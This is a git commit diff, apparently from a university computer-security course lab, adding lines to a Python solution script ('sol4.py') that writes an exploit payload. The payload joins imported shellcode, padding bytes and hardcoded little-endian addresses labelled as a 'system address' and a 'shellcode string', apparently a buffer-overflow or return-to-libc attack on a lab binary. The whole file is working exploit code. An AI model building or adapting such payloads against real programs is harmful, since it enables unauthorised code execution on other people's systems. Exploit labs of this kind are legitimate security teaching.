29a87d79e47790a2c0b9c4c8461ab8b2ffbe6de3
marymx <marymx@umich.edu>
2022-03-31 21:11:54 +0000

    Automatic commit by test script for marymx yaoche

--- sol4.py
+++ sol4.py
@@ -1,4 +1,6 @@
 
 import sys
 from shellcode import shellcode
+addr = 0x804fef0.to_bytes(4, "little") #system address
+addr2 = 0xfff6b998.to_bytes(4, "little") #shellcode string
 sys.stdout.buffer.write(shellcode + b"A"*3 + addr + addr2)
